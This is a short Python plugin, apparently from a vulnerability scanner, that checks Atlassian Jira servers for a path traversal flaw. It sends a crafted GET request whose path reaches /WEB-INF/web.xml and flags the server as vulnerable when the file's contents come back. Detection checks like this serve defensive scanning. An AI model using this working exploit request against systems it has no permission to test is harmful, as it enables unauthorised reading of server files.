# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Atlassian Jira 文件读取漏洞",
        "description": "Atlassian JIRA是一个项目管理和开发管理工具，Atlassian Jira 服务器和数据中心版本允许远程攻击者通过 /WEB-INF/web.xml 端点中的路径遍历漏洞读取特定文件。受影响的版本为 8.5.14 之前的版本、8.13.6 之前的 8.6.0 版本以及 8.16.1 之前的 8.14.0 版本。",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='GET',
            path='./s/s3gundo/_/;anythingulike/WEB-INF/web.xml',
            timeout=15
        )
        if r.status_code == 200 and 'Atlassian JIRA Web Application' in r.text:
            return {"LoopholeInfo": self.__info__}
